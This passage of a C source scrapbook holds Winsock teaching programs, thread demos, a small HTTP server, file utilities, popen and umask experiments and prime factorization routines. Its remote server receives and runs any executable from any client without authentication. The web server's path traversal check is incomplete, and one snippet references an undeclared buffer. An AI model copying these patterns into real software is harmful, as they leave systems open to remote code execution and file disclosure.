     printf("  *** ERROR - Unable to open '%s'\n", argv[3]);
     exit(1);
  }

  // Receive output file from server
  length = SIZE;
  while(length > 0)
  {
     length = recv(remote_s, bin_buf, SIZE, 0);
     write(fh, bin_buf, length);
  }

  // Close output file that was received from the remote
  close(fh);

  // Close the sockets
  closesocket(local_s);
  closesocket(remote_s);

  // Output final status message
  printf("Execution of '%s' and transfer of output to '%s' done! \n",
    argv[2], argv[3]);

  // Cleanup Winsock
  WSACleanup();
}

/*_______________ winremrunremote.c _______________*/

//=  Remote server to receive and execute a *.exe file, stdout is returned    =
//=   - local.c is the sending client                                         =
//=    1) This program compiles for Winsock only                              =
//=    2) This program should be started before running local                 =
//=  Sample execution:                                                        =
//=                                                                           =
//=    d:\work>remote                                                         =
//=    Waiting for a connection...                                            =
//=      Connection established, receiving remote executable file             =
//=      Executing remote executable (stdout to output file)                  =
//=    Waiting for a connection...                                            =
//=  Build: bcc32 remote.c                                                    =
//=           Student, Department of Computer Science and Engineering         =
//=            KJC (12/17/98) - Added main loop and minor clean-up            =

#include <stdio.h>              // Needed for printf()
#include <stdlib.h>             // Needed for exit()
#include <string.h>             // Needed for memcpy() and strcpy()
#include <windows.h>            // Needed for Sleep() and Winsock stuff
#include <fcntl.h>              // Needed for file i/o constants
#include <sys\stat.h>           // Needed for file i/o constants
#include <io.h>                 // Needed for open(), close(), and eof()

#define  PORT_NUM           1050    // Arbitrary port number for the server
#define  MAX_LISTEN            1    // Maximum number of listens to queue
#define  IN_FILE        "run.exe"   // Name given to transferred *.exe file
#define  TEXT_FILE       "output"   // Name of output file for stdout
#define  SIZE                256    // Size in bytes of transfer buffer

void main(void)
{
  WORD wVersionRequested = MAKEWORD(1,1);       // WSA functions
  WSADATA wsaData;                              // WSA functions

  unsigned int         remote_s;        // Remote socket descriptor
  struct sockaddr_in   remote_addr;     // Remote Internet address
  struct sockaddr_in   server_addr;     // Server Internet address
  unsigned int         local_s;         // Local socket descriptor
  struct sockaddr_in   local_addr;      // Local Internet address
  struct in_addr       local_ip_addr;   // Local IP address
  int                  addr_len;        // Internet address length
  unsigned char        bin_buf[SIZE];   // File transfer buffer
  unsigned int         fh;              // File handle
  unsigned int         length;          // Length of buffers transferred

  // Do forever
  while(1)
  {
    // Winsock initialization
    WSAStartup(wVersionRequested, &wsaData);

    // Create a socket
    remote_s = socket(AF_INET, SOCK_STREAM, 0);

    // Fill-in my socket's address information and bind the socket
    remote_addr.sin_family      = AF_INET;            // Address family to use
    remote_addr.sin_port        = htons(PORT_NUM);    // Port number to use
    remote_addr.sin_addr.s_addr = htonl(INADDR_ANY);  // Listen on any IP addr
    bind(remote_s, (struct sockaddr *)&remote_addr, sizeof(remote_addr));

    // Output waiting message
    printf("Waiting for a connection... \n");

    // Listen for connections (queueing up to MAX_LISTEN)
    listen(remote_s, MAX_LISTEN);

    // Accept a connection, accept() will block and return with local_addr
    addr_len = sizeof(local_addr);
    local_s = accept(remote_s, (struct sockaddr *)&local_addr, &addr_len);

    // Copy the four-byte client IP address into an IP address structure
    memcpy(&local_ip_addr, &local_addr.sin_addr.s_addr, 4);

    // Output message acknowledging receipt, saving of *.exe
    printf("  Connection established, receiving remote executable file \n");

    // Open IN_FILE for remote executable file
    if((fh = open(IN_FILE, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY,
                   S_IREAD | S_IWRITE)) == -1)
     {
        printf("  *** ERROR - unable to open executable file \n");
        exit(1);
     }

    // Receive executable file from local
    length = 256;
    while(length > 0)
    {
       length = recv(local_s, bin_buf, SIZE, 0);
       write(fh, bin_buf, length);
    }

    // Close the received IN_FILE
    close(fh);

    // Close sockets
    closesocket(remote_s);
    closesocket(local_s);

    // Cleanup Winsock
    WSACleanup();

    // Print message acknowledging execution of *.exe
    printf("  Executing remote executable (stdout to output file) \n");

    // Execute remote executable file (in IN_FILE)
    system(IN_FILE ">" TEXT_FILE);

    // Winsock initialization to re-open socket to send output file to local
    WSAStartup(wVersionRequested, &wsaData);

    // Create a socket
    //   - AF_INET is Address Family Internet and SOCK_STREAM is streams
    local_s = socket(AF_INET, SOCK_STREAM, 0);

    // Fill in the server's socket address information and connect with
    // the listening local
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(PORT_NUM);
    server_addr.sin_addr.s_addr = inet_addr(inet_ntoa(local_ip_addr));
    connect(local_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Print message acknowledging transfer of output to client
    printf("  Sending output file to local host \n");

    // Open output file to send to client
    if((fh = open(TEXT_FILE, O_RDONLY | O_BINARY, S_IREAD | S_IWRITE)) == -1)
    {
       printf("  *** ERROR - unable to open output file \n");
       exit(1);
    }

    // Send output file to client
    while(!eof(fh))
    {
       length = read(fh, bin_buf, SIZE);
       send(local_s, bin_buf, length, 0);
    }

    // Close output file
    close(fh);

    // Close sockets
    closesocket(remote_s);
    closesocket(local_s);

    // Cleanup Winsock
    WSACleanup();

    // Delay to allow everything to clean-up
    Sleep(100);
  }
}

/*_______________ winsleep.c _______________*/

//=  Program to "sleep" for N seconds                                       =
//=    1) Command line input is number of seconds (real number) to delay    =
//=       with resolution to milliseconds.                                  =
//=    2) Windows only (uses windows Sleep() function)                      =
//=    3) Solaris has a sleep command that is very similar to this program  =
//=  Build: bcc32 sleep.c or cl sleep.c                                     =
//=  Execute: sleep number_of_seconds                                       =

#include <stdio.h>           // Needed for printf()
#include <stdlib.h>          // Needed for exit() and atof()
#include <windows.h>         // Needed for Sleep()

//=  Main program                                                           =
void main(int argc, char *argv[])
{
  int    sleep_time;         // Number of milliseconds to sleep

  if (argc != 2)
  {
    printf("*** ERROR - incorrect number of command line arguments \n");
    printf("            usage is 'sleep number_of_seconds'         \n");
    exit(1);
  }

  // Sleep time in milliseconds
  sleep_time = (int) (1000.0 * atof(argv[1]));

  // Now sleep for sleep_time milliseconds
  Sleep(sleep_time);
}

/*_______________ winthread.c _______________*/

//=  A simple bare-bones example of threads in Windows 9X/NT/2K/XP          =
//=    1) This program demonstrates how threads work and shows how a global =
//=       "kill variable" can be set and then checked-for in each thread.   =
//=       When the variable is detected as set, the thread is ended.        =
//=    2) This program is only for Windows 9X/NT can compiles with both     =
//=       Borland and Microsoft compilers                                   =
//=    3) For Borland C/C++ 5.5 build use bcc32 -WM thresd.c                =
//=    4) *TODO* Do not understand why thread id's are different as         =
//=       output in main() and in thread_code()                             =
//= Example execution: (note that thread id's vary between runs)            =
//=                                                                         =
//=   Kicking-off threads...                                                =
//=   Executing thread # 0 with ID = 178                                    =
//=     i = 0 in thread # 0                                                 =
//=   Created thread # 0, ID = 56                                           =
//=   Created thread # 1, ID = 60                                           =
//=   All threads have been kicked-off...                                   =
//=   Executing thread # 1 with ID = 180                                    =
//=     i = 0 in thread # 1                                                 =
//=     i = 1 in thread # 0                                                 =
//=     i = 1 in thread # 1                                                 =
//=     i = 2 in thread # 0                                                 =
//=     i = 2 in thread # 1                                                 =
//=     i = 3 in thread # 0                                                 =
//=     i = 3 in thread # 1                                                 =
//=     i = 4 in thread # 0                                                 =
//=     i = 4 in thread # 1                                                 =
//=   Killing thread #0 from main()...                                      =
//=     >>> Killing thread # 0                                              =
//=     i = 5 in thread # 1                                                 =
//=     i = 6 in thread # 1                                                 =
//=     i = 7 in thread # 1                                                 =
//=     i = 8 in thread # 1                                                 =
//=     i = 9 in thread # 1                                                 =
//=   Killing thread #1 from main()...                                      =
//=   Waiting for 5 seconds and then ending main()...                       =
//=     >>> Killing thread # 1                                              =
//=   End!                                                                  =
//=  Build: bcc32 thread.c, cl thread.c                                     =
//=  Execute: thread                                                        =
//=           KJC (02/24/99) - Changed "%d" to "%u" in printf()'s           =

#include <stdio.h>      // Needed for printf()
#include <stdlib.h>     // Needed for exit()
#include <errno.h>      // Needed for errno
#include <stddef.h>     // Needed for _threadid
#include <process.h>    // Needed for _beginthread(), and _endthread()
#include <windows.h>    // Needed for Sleep()

#define NUM_THREAD  2   // Number of threads (numbered 0 ... NUM_THREAD - 1)

int Kill[NUM_THREAD];   // Kill flags for threads by thread number

void thread_code(void *threadno);  // Thread function

//=  Main program                                                           =
void main(void)
{
  unsigned int thread_id;          // Thread id assigned by Windows
  int i;                           // Loop counter

  // Initialize Kill[] to all zeros
  for (i=0; i<NUM_THREAD; i++)
    Kill[i] = 0;

  // Kick-off threads
  printf("Kicking-off threads... \n");
  for (i=0; i<NUM_THREAD; i++)
  {
    if ((thread_id = _beginthread(thread_code,4096,(void *)i)) == -1)
    {
      printf("Unable to create thread %u, errno = %d \n", i, errno);
      exit(1);
    }
    printf("Created thread # %d, ID = %u \n", i, thread_id);
  }
  printf("All threads have been kicked-off... \n");

  // Wait for 5 seconds and then kill thread #0
  Sleep(5000);
  printf("Killing thread #0 from main()... \n");
  Kill[0] = 1;

  // Wait for 5 more seconds and then kill thread #1
  Sleep(5000);
  printf("Killing thread #1 from main()... \n");
  Kill[1] = 1;

  // Wait for 5 more seconds and then output "End" and end
  printf("Waiting for 5 seconds and then ending main()... \n");
  Sleep(5000);
  printf("End! \n");
}

//=  This is is the thread_code function                                    =
//=   - Function and arguments are always declared as void                  =
void thread_code(void *threadno)
{
  int    thread_num;    // Thread number as assigned in main()
  int    i;             // Loop counter

  // Set thread_num to threah number as assigned in main()
  thread_num = (int) threadno;

  // Loop 100 times outputing thread status.
  printf("Executing thread # %d with ID = %u \n", thread_num, _threadid);
  for (i=0; i<100; i++)
  {
    printf("  i = %d in thread # %d \n", i, thread_num);

    // Wait for 1 second
    Sleep(1000);

    // Check if Kill flag is set for this thread number and then _endthread()
    if (Kill[thread_num] > 0)
    {
      printf("  >>> Killing thread # %d \n", thread_num);
      _endthread();
    }
  }

  // Always end a thread function with _endthread()
  _endthread();
}

/*_______________ winthrweblite1.c _______________*/

//=  A super light-weight secure HTTP server for Windows                      =
//=   - Uses threads to allow for parallel connections                        =
//=    1) Compiles for Winsock only since uses Windows threads.               =
//=    2) Serves HTML, text, and GIF only.                                    =
//=    3) Serves files from directory (and directories below, but not above)  =
//=       that weblite1.exe is running in.  This makes weblite1 "secure".     =
//=    4) Sometimes the browser drops a connection when doing a refresh.      =
//=       This is handled by checking the recv() return code in the           =
//=       function that handles GETs.  This is only seen when using           =
//=       Explorer.                                                           =
//=    5) The 404 HTML message does not always display in Explorer.           =
//=    6) Ignore the compile-time warnings regarding unreachable code         =
//=       in main().                                                          =
//=    7) For Borland C/C++ 5.5 build use bcc32 -WM weblite.c                 =
//=  Execution notes:                                                         =
//=   1) Execute this program in the directory which will be the root for     =
//=      all file references (i.e., the directory that is considered at       =
//=      "public.html").                                                      =
//=   2) Open a Web browser and surf to http://xxx.xxx.xxx.xxx/yyy where      =
//=      xxx.xxx.xxx.xxx is the IP address or hostname of the machine that    =
//=      weblite is executing on and yyy is the requested object.             =
//=   3) The only non-error output (to stdout) from weblite1 is a message     =
//=      with the name of the file currently being sent.                      =
//=  Build: bcc32 weblite1.c                                                  =
//=  Execute: weblite1                                                        =
#include <stdio.h>          // Needed for printf() and sscanf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for str*()
#include <winsock.h>        // Needed for all Winsock stuff
#include <stddef.h>         // Needed for _threadid
#include <process.h>        // Needed for _beginthread() and _endthread()
#include <fcntl.h>          // Needed for file i/o constants
#include <sys\stat.h>       // Needed for file i/o constants
#include <io.h>             // Needed for open(), close(), and eof()

#define OK_IMAGE  "HTTP/1.0 200 OK\r\nContent-Type:image/gif\r\n\r\n"
#define OK_TEXT   "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
#define NOTOK_404 "HTTP/1.0 404 Not Found\r\nContent-Type:text/html\r\n\r\n"
#define MESS_404  "<html><body><h1>FILE NOT FOUND</h1></body></html>"

#define  PORT_NUM              80     // Port number for a Web server
#define  BUF_SIZE            1024     // Buffer size (big enough for a GET)

void handle_get(void *in_arg);        // Thread function to handle GET

void main(void)
{
  WORD wVersionRequested = MAKEWORD(1,1);    // Stuff for WSA functions
  WSADATA wsaData;                           // Stuff for WSA functions
  int                  server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  int                  client_s;             // Client socket descriptor
  struct sockaddr_in   client_addr;          // Client Internet address
  struct in_addr       client_ip_addr;       // Client IP address
  int                  addr_len;             // Internet address length

  // Initialize Winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Create a socket, fill-in address information, and then bind it
  server_s = socket(AF_INET, SOCK_STREAM, 0);
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT_NUM);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Set-up the listen
  listen(server_s, 1000);

  // Main loop to accept connections and then spin-off thread to handle the GET
  printf(">>> weblite1 is running on port %d <<< \n", PORT_NUM);
  while(1)
  {
    addr_len = sizeof(client_addr);
    client_s = accept(server_s, (struct sockaddr *)&client_addr, &addr_len);
    if (client_s == -1)
    {
      printf("ERROR - Unable to create a socket \n");
      exit(1);
    }

    if (_beginthread(handle_get, 4096, (void *)client_s) < 0)
    {
      printf("ERROR - Unable to create a thread to handle the GET \n");
      exit(1);
    }
  }
}

//=  This is is the thread function to handle the GET                       =
void handle_get(void *in_arg)
{
  int            client_s;             // Client socket descriptor
  char           in_buf[BUF_SIZE];     // Input buffer for GET request
  char           out_buf[BUF_SIZE];    // Output buffer for HTML response
  int            fh;                   // File handle
  int            buf_len;              // Buffer length for file reads
  char           command[BUF_SIZE];    // Command buffer
  char           file_name[BUF_SIZE];  // File name buffer
  int            retcode;              // Return code

  // Set client_s to in_arg
  client_s = (int) in_arg;

  // Receive the (presumed) GET request from the Web browser
  retcode = recv(client_s, in_buf, BUF_SIZE, 0);

  // If the recv() return code is bad then bail-out (see note #3)
  if (retcode <= 0)
  {
    printf("ERROR - Receive failed --- probably due to dropped connection \n");
    closesocket(client_s);
    _endthread();
  }

  // Parse out the command from the (presumed) GET request and filename
  sscanf(in_buf, "%s %s \n", command, file_name);

  // Check if command really is a GET, if not then bail-out
  if (strcmp(command, "GET") != 0)
  {
    printf("ERROR - Not a GET --- received command = '%s' \n", command);
    closesocket(client_s);
    _endthread();
  }

  // It must be a GET... open the requested file
  //  - Start at 2nd char to get rid of leading "\"
  fh = open(&file_name[1], O_RDONLY | O_BINARY, S_IREAD | S_IWRITE);

  // If file does not exist, then return a 404 and bail-out
  if (fh == -1)
  {
    printf("File '%s' not found --- sending an HTTP 404 \n", &file_name[1]);
    strcpy(out_buf, NOTOK_404);
    send(client_s, out_buf, strlen(out_buf), 0);
    strcpy(out_buf, MESS_404);
    send(client_s, out_buf, strlen(out_buf), 0);
    closesocket(client_s);
    _endthread();
  }

  // Check that filename does not start with a "..", "/", "\", or have a ":" in
  // the second position indicating a disk identifier (e.g., "c:").
  //  - This is a security check to prevent grabbing any file on the server
  if (((file_name[1] == '.') && (file_name[2] == '.')) ||
       (file_name[1] == '/') || (file_name[1] == '\\') ||
       (file_name[2] == ':'))
  {
    printf("SECURITY VIOLATION --- trying to read '%s' \n", &file_name[1]);
    close(fh);
    closesocket(client_s);
    _endthread();
  }

  // Generate and send the response
  printf("Sending file '%s' \n", &file_name[1]);
  if (strstr(file_name, ".gif") != NULL)
    strcpy(out_buf, OK_IMAGE);
  else
    strcpy(out_buf, OK_TEXT);
  send(client_s, out_buf, strlen(out_buf), 0);
  while(!eof(fh))
  {
    buf_len = read(fh, out_buf, BUF_SIZE);
    send(client_s, out_buf, buf_len, 0);
  }

  // Close the file, close the client socket, and end the thread
  close(fh);
  closesocket(client_s);
  _endthread();
}

# endif /* WINTHRSCK */

/*	____	____	____	____	____	____	____	____	*/

# ifdef XBPS

#include <stdio.h>
#include <stdlib.h>
#include <sys/procfs.h>
#include <fcntl.h>

extern int	  errno;

int main (int argc, char *argv[]) {
	prpsinfo_t	prp;
	int		cllen = 0, count = 0, fd, ret;
	char		*buf;
	long		offset;
	long		args[250];
	long		argoff;
	char		proc_id[50];
	ssize_t		ioc ;

	if (argc < 2) {
		fprintf (stderr, "Usage: %s PID\n", argv[0]);
		exit (EXIT_FAILURE);
	}

	strcpy (proc_id, "/proc/");
	strcat (proc_id, argv[1]);

	buf = (char *) malloc (250);

	(void) memset (buf, 0, 250);
	(void) memset ((char *) args, 0, sizeof (args));
 
	printf ("open (%s)\n", proc_id) ;

	if ((fd = open (proc_id, O_RDONLY)) < 0) {
		fprintf (stderr, "open (%s) fail\n", proc_id);
		exit (EXIT_FAILURE);
	}

	if ((ret = ioctl (fd, PIOCPSINFO, &prp)) < 0) {
		fprintf (stderr, "ioctl failed\n");
		close (fd);
		exit (EXIT_FAILURE);
	}

	fprintf (stdout, "argc = %d pid %d\n", prp.pr_argc, atoi (argv[1]));

	offset = (long) prp.pr_argv;

	if ( (ioc = pread (fd, (char *) args, sizeof (args), offset)) <= 0) {
		fprintf (stderr, "pread error (errno=%d)\n", errno);
		close (fd);
		exit (EXIT_FAILURE);
	}

	printf ("pread=(%ld)\n", (long)(ioc/sizeof(char *)));

	if ((argoff = args[count++]) == 0) {
		printf ("argless process ?!\n");
		exit (3);
	}

	while (1) {
		if ((pread (fd, buf, 80, argoff)) <= 0) {
			fprintf (stderr, "pread argument fail\n");
			close (fd);
			exit (EXIT_FAILURE);
		}

		fprintf (stdout, "arg(%d)=[%s]\n", count, buf);
		cllen += strlen (buf) ;

		if ((argoff = args[count++]) == 0) {
			close (fd);
			printf ("cmdlen=(%d)\n", cllen) ;
			exit (EXIT_SUCCESS);
		}
	}
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef TASC

# include <conio.h>

main () {

	int x ;

	clrscr () ;

	for ( x = 1 ; x < 256 ; ++x ) {
		putch (x) ;
		cprintf ("=%d\r\n", x) ;
		if (x % 20 == 0)
			getch () ;
	}
}

# endif

# ifdef GAMY

# include <dos.h>
# include <bios.h>

main () {

	int x = 1 ;

	for ( ; ; ) {

		printf ("%d\n", x++) ;
		delay (500) ;

		if ( bioskey (1) != 0 )
			break ;
	}

	x = getch () ;

	printf ("x = %c %d \n", x, x) ;
}

# endif

/*	____	____	____	____	____	____	____	____	*/

/* cbf size : create big file (64 byte aligned) */

# include <stdio.h>
# include <stdlib.h>

void main (argc, argv) char * * argv ; {

    __int64 filesize , currsize , linenumb ;
    FILE * bfp ;

    if (argc != 2)
        return ;

    filesize = _atoi64 (*(argv+1)) ;
    bfp = fopen ("bigfile.txt", "w") ;

    for ( linenumb = 1 , currsize = 0 ;
            currsize < filesize ; currsize += 64 , ++linenumb ) {
        fprintf (bfp, "lin=(%25I64d)byt=(%25I64d)\n", linenumb, currsize) ;
    }

    fclose (bfp) ;
}

/*	____	____	____	____	____	____	____	____	*/

/* sbf size : split big file */

# include <stdio.h>
# include <stdlib.h>

# define LINESIZE	1000

void main (argc, argv) char * * argv ; {

	__int64 filesize , currsize = 0 , linenumb , filenumb = 1 ;
	FILE * bfp , * sfp = NULL ;
	char filename [20] , linebuff [LINESIZE] ;

	if (argc != 2)
		return ;

	filesize = _atoi64 (*(argv+1)) ;
	bfp = fopen ("bigfile.txt", "r") ;

	while ( fgets (linebuff, LINESIZE, bfp) != NULL ) {
		if (currsize == 0) {
			sprintf (filename, "splt%04I64d.txt", filenumb++) ;
			sfp = fopen (filename, "w") ;
		}
		fputs (linebuff, sfp) ; currsize += strlen (linebuff) ;
		if ( currsize > filesize ) {
			fclose (sfp) ; currsize = 0 ;
		}
	}

	fclose (sfp) ;
	fclose (bfp) ;
}

/*	____	____	____	____	____	____	____	____	*/

# ifdef LABUMASK

/* tum : test umask */

# include <sys/types.h>
# include <sys/stat.h>

# include <stdio.h>
# include <fcntl.h>

# define	WORKMASK		( S_IRWXO )
# define	WORKTEMP		"tum.tmp"

mode_t prevmask ;
mode_t workmask = WORKMASK ;

tcf () {

	int fd ;
	FILE * fp ;

	fd = open ( WORKTEMP, O_CREAT|O_WRONLY , 0666 ) ;
	write (fd, "tmp", 3) ;
	close (fd) ;
	system ("ls -l tum.tmp") ;
	unlink (WORKTEMP) ;

	fp = fopen (WORKTEMP, "w") ;
	fwrite ("tmp", 3, 1, fp) ;
	fclose (fp) ;
	system ("ls -l tum.tmp") ;
	unlink (WORKTEMP) ;
}

tum () {

	prevmask = umask (workmask) ;

	printf ("prevmask=%lo workmask=%lo \n", (long) prevmask, (long) workmask) ;
}

main () {

	tcf () ;
	tum () ;
	tcf () ;
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef LABPOPEN

/* super_popen */

#include <stdio.h>
#include <errno.h>
#include <sys/select.h>

int super_popen( FILE **SI_SO_SE, const char *cmd ) {
     int           si[2] = { -1, -1 };
     int           so[2] = { -1, -1 };
     int           se[2] = { -1, -1 };
     pid_t      pid;
     int           e;
     int           fd;

     /*
      * Create 3 pipes to talk to subprocess on stdin/stdout/stderr
      */
     if (pipe( si ) != 0 || pipe( so ) != 0 || pipe( se ) != 0) goto SHUTDOWN;

     if ((pid = fork( )) == -1) goto SHUTDOWN;

     if (pid) {                         /* in parent */
          close( si[0] );
          close( so[1] );
          close( se[1] );
          SI_SO_SE[0] = fdopen( si[1], "w" );
          SI_SO_SE[1] = fdopen( so[0], "r" );
          SI_SO_SE[2] = fdopen( se[0], "r" );
          
          return 0;                    /* OK! */
     }

     /*
      * This is the child process...we have to fiddle around with the
      * pipe descriptors and then exec the program.
      */

     /*
      * Make sure none of our stdin/stdout/stderr descriptors are
      * on FDs 0, 1, or 2 (if they are, it'll screw things up when
      * we do the dup2()'s)
      */
     if (si[0] < 2 || so[1] < 2 || se[1] < 2) {
          int      free_index = 0;
          int      free_fds[3];
          printf( "have to fuck with FDs in child\n" );
          for (fd = 3; fd < FD_SETSIZE; fd++) {
               if (fd != si[0] && fd != si[1] && fd != se[1]) {
                    free_fds[free_index++] = fd;
                    if (free_index == 3) break;
               }
          }
          if (dup2( si[0], free_fds[0] ) == -1 ||
               dup2( so[1], free_fds[1] ) == -1 ||
               dup2( se[1], free_fds[2] ) == -1) exit( errno );
          si[0] = free_fds[0];
          so[1] = free_fds[1];
          se[1] = free_fds[2];
     }
          
     /* close all other descriptors...don't want child to have copies */
     for (fd = 0; fd < FD_SETSIZE; fd++)
          if (fd != si[0] && fd != so[1] && fd != se[1]) close( fd );
     
     dup2( si[0], 0 );               /* attach pipes to FD 0, 1, and 2 */
     dup2( so[1], 1 );
     dup2( se[1], 2 );

     close( si[0] );
     close( so[1] );
     close( se[1] );

/*     write( 1, "Hello\n", 6 );
     write( 2, "World\n", 6 );
     exit( 0 );*/

     exit( execl( "/usr/bin/sh", "sh", "-c", cmd, 0 ) );

 SHUTDOWN:     /* something went wrong...close the pipes & etc */
     e = errno;
     close( si[0] ); close( si[1] );
     close( so[0] ); close( so[1] );
     close( se[0] ); close( se[1] );
     errno = e;
     return -1;
}

int
main( int argc, char **argv )
{
     FILE     *child_io[3];

     if (argc != 2) {
          printf( "usage: %s <name-of-program-to-run>\n", argv[0] );
          exit( 1 );
     }

     if (super_popen( child_io, argv[1] ) == 0) {
          char      buf[256];
          
          fprintf( child_io[0], "Message to child\n" );
          fflush( child_io[0] );

          while (fgets( buf, sizeof(buf), child_io[1] ) != 0) {
               printf( "Child STDOUT: \"%.*s\"\n", strlen(buf) - 1, buf );
          }

          while (fgets( buf, sizeof(buf), child_io[2] ) != 0) {
               printf( "Child STDERR: \"%.*s\"\n", strlen(buf) - 1, buf );
          }
     } else {
          printf("couldn't run %s: %d (%s)\n", argv[1], errno, strerror(errno));
     }

     exit( 0 );
}

#include <stdio.h>

int
main( int argc, char **argv )
{
     char      buf[128];

     fgets( buf, sizeof(buf), stdin );
     printf( "Child received \"%s\" on stdin\n", buf );
     fprintf( stdout, "This is a message on stdout\n" );
     fprintf( stderr, "This is a message on stderr\n" );
     return 0;
}

/* sample */

#include <stdio.h>
#include <stdlib.h>
main(argc,argv) char * * argv ; {

     char *cmd = *(argv+1) ;
     char buf[BUFSIZ];
     FILE *ptr;

     if ((ptr = popen(cmd, "r")) != NULL)
          while (fgets(buf, BUFSIZ, ptr) != NULL)
               (void) printf("%s", buf);
     return 0;
}

# endif /* LABPOPEN */

/*	____	____	____	____	____	____	____	____	*/

/* texsys : exercise exit() and system() */

main (argc, argv) char * * argv ; {

	int rv ;

	while (*++argv) {
		if ( strcmp (*argv, "-e") == 0 ) {
			exit ( atoi (*++argv) ) ;
		} else if ( strcmp (*argv, "-s") == 0 ) {
			rv = system (*++argv) ;
			printf ("rv>>8=(%d)\n", rv>>8) ;
		}
	}
}

/*	____	____	____	____	____	____	____	____	*/

/* build cypstr mask buffer */

# include <string.h>

unsigned char csbm [128] ;

dmpbuf () {

	int j ;

	printf ("unsigned char csbm [128] = {\n") ;

	for ( j = 1 ; j < 128 ; ++j ) {
		printf ( /*"%3d,"*/ "0x%02x,", mb[j-1] ) ;
		if ( j && ((j % 16) == 0) )
			printf ("\n") ;
	}

	printf ("0x00\n} ;\n") ;
}

main (argc, argv) char * * argv ; {

	int j ;

	for ( j = mb[127] = 0 ; j < 127 ; ++j )
		mb[j] = j+129 ;

	dmpbuf () ;
	strfry (mb) ;
	dmpbuf () ;
}

/*	____	____	____	____	____	____	____	____	*/

# include <string.h>

fry (s) {

	printf ("f(%s)=[%s]\n", s, strfry (s)) ;
}

/*	____	____	____	____	____	____	____	____	*/

chronom1 () {

  clock_t tv, tv2;
  int i, min, diff, bits;
  bits = sizeof(tv) << 3;
  tv = (clock_t) -1 ^ (1 << (bits - 1));
  printf("Number of bits in clock_t: %d\n", bits);
  printf("Maximum clock_t: %d\n", tv);
  printf("CLOCKS_PER_SEC: %d\n", CLOCKS_PER_SEC);
  printf("Maximum computable elapsed time: %d seconds.\n", tv / CLOCKS_PER_SEC);
  min = tv;
  for (i = 1; i < 10; i++) {
    tv = clock();
    while ((tv2 = clock()) == tv);
    diff = tv2 - tv;
    tv = tv2;
    min = diff < min ? diff : min;
  }
  printf("Minimum detected elapsed time: %f seconds.\n", 
	 (double) min / (double) CLOCKS_PER_SEC);
}

/*	____	____	____	____	____	____	____	____	*/

chronom2 () {

# define CPUTIME (getrusage(RUSAGE_SELF,&ruse), \
  ruse.ru_utime.tv_sec + ruse.ru_stime.tv_sec + \
  1e-6 * (ruse.ru_utime.tv_usec + ruse.ru_stime.tv_usec))

	struct rusage ruse;
	double t0, t1;
	time_t u1,u2;

   time(&u1);
   t0 = CPUTIME;

   /* place code to be timed here */

   t1 = CPUTIME;
   time(&u2);

   printf("CPU time = %7.2f secs.\nUser Time = %d secs.\n\n",t1-t0,(int)(u2-u1));
}

/*	____	____	____	____	____	____	____	____	*/

/*
** primefactor.c: produce the prime factorization of a given number
**	partial solution to hw#8
**   -- written by Jeff Tian, 3/2/99.     
*/

void PrimeFactor(int x);

primfac2 () {

   int n ;
   char c='y';

   printf("This program produces prime factorization for input numbers.\n\n");

   while (c == 'y' || c == 'Y')
   {
      printf("Please enter a positive integer: ");
      scanf ("%d", &n) ;
	  if ( n <= 0 )
		continue ;
      PrimeFactor(n);
      printf("\nWould you like to try another number [y/n] ? ");
      while (isspace(c = getchar()));
      while (getchar() != '\n');
   }
}

/*
** PrimeFactor() -- an efficient function for prime factorization
*/ 

void
PrimeFactor(int x)
{
	int i=2, limit;
	int steps = 0 ;

   printf("The prime factors for %d is:\n", x);
   limit = sqrt(x);
   while (i <= limit ) 
   {
		++steps ;
      if(x%i == 0)
      {
         printf("%d X ", i);
         x = x/i;
         limit = sqrt(x);
      }
      else 
      {
         i++;
      }
   }
   printf("%d\n", x) ;
	printf ("steps=%d\n", steps) ;
}

/*	____	____	____	____	____	____	____	____	*/

primfac3 () {

    int x, result, count=2 ;
	int steps = 0 ;

    printf("Please enter a positive integer: ");
    scanf ("%d", &x) ;

    result=x;

    while (result !=1)
    {
       while ((result % count) != 0) 
       {
		++steps ;
         count++;
       }
       printf ("%d ", count);
       result=result/count;
       count=2;
    }
    printf("\n");
	printf ("steps=%d\n", steps) ;
}

/*	____	____	____	____	____	____	____	____	*/
/* Print prime factorization for a number 				*/
/* from "Efficient C Programming:  A Practical Approach", by M.A. Weiss */
/* Prentice Hall 1995							*/

primfac1 () {

	unsigned long NumberToFactor, PossibleFactor, UnfactoredPart;
	int steps = 0 ;

	printf( "Enter a number to factor: ");
	scanf( "%lu", &NumberToFactor );

	PossibleFactor = 2;
	UnfactoredPart = NumberToFactor;

	while( PossibleFactor * PossibleFactor <= UnfactoredPart ) {
		++steps ;
		if (UnfactoredPart % PossibleFactor == 0)
			{ /* found a factor */
			printf( "%lu ", PossibleFactor);
			UnfactoredPart /= PossibleFactor;
			}
		else
			{ /* no factor; try next factor */
			if (PossibleFactor == 2 )
				PossibleFactor = 3;
			else
				PossibleFactor += 2;
			}
		}
	
	/* print last factor */
	printf( "%lu\n", UnfactoredPart);
	printf ("steps=%d\n", steps) ;
}

/*	____	____	____	____	____	____	____	____	*/
/*	stdlab								*/
/*	____	____	____	____	____	____	____	____	*/

# ifndef MAXNAMSIZ
#	define	MAXNAMSIZ	64
# endif

struct labctl {

	int		lc_code ;
	int  (* lc_func) () ;
	char  * lc_name ;
	char  * lc_desc ;
} ;

typedef		struct labctl		LABCTL ;

LABCTL labuf [] = {

	{ 1001, primfac1, "primfac1", "prime factorization 1"			} ,
	{ 1002, primfac2, "primfac2", "prime factorization 2"			} ,
	{ 1003, primfac3, "primfac3", "prime factorization 3"			} ,

	{   -1, NULL,     NULL,       NULL								}

} ;

int		stdinflag = 0 ;

labusage () {

	LABCTL * lp ;

	for ( lp = labuf ; lp->lc_code != -1 ; ++lp )
		printf ("%-8s : %s \n", lp->lc_name, lp->lc_desc) ;
}

labit (what) char * what ; {

	LABCTL * lp ;

